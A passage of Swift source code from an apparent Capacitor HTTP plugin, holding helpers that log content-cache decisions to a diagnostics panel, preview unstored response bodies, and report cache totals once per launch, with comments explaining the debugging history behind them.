        CAPLog.print("[SangTacHttp:\(tag)] \(SangTacHttpPlugin.redact(message))")
    }

    /**
     Where a cache decision has to be readable: the in-page panel and the durable
     log behind it, not only CAPLog.

     The first version of the content cache wrote every decision through
     `callLog`, which is Console.app -- unreadable on a sideloaded build. The
     2026-10-13 device log therefore showed the requests but none of the
     decisions: no `cache hit`, no `cached class=`, no `not cached`, so "is it
     hitting?" had no answer in the one artefact the reader can produce. A failed
     image (`report("ERR", ...)`) *did* reach the panel in that same log, which is
     what pointed at the difference.

     `report` is gated on the diagnostics switch, so this costs nothing while
     logging is off -- and when it is off, nobody is reading the panel anyway.
     */
    private func cacheLog(_ message: String) {
        callLog("cache", message)
        report("CACHE", message)
    }

    /**
     A bounded look at the body of an answer that was *not* stored.

     The reason string says which guard refused it; this says what the answer
     actually was, which is the other half of the question -- the 2026-10-13 log
     had `userinfo.php` refused seven times and no way to tell whether the body was
     an error page, a truncated JSON document, or a perfectly good profile that a
     guard did not understand. Bounded and whitespace-collapsed so one line stays
     one line; `report` redacts it like every other line.
     */
    private static func head(_ body: Data) -> String {
        let text = String(decoding: body.prefix(240), as: UTF8.self)
        let collapsed = text
            .split(whereSeparator: { $0.isNewline || $0 == "\t" })
            .joined(separator: " ")
        if collapsed.count <= 80 { return collapsed }
        return String(collapsed.prefix(80)) + "..."
    }

    /// The cache's running totals, attached once per launch to the first answer
    /// that is stored -- so a log is self-contained about how much there is.
    private var loggedTotals = false

    private func cacheTotalsOnce() -> String {
        inFlightLock.lock()
        let already = loggedTotals
        loggedTotals = true
        inFlightLock.unlock()
        guard !already else { return "" }
        let stats = contentCache.stats()
        // `refusals=` is what proves a written-down refusal survived the process
        // on a launch that never redrew the broken image, which is the one claim
        // this round is making.
        return " | cache now entries=\(stats["entries"] ?? 0) bytes=\(stats["bytes"] ?? 0)"
            + " hits=\(stats["hits"] ?? 0) refusals=\(contentCache.storedRefusalCount)"
    }
}
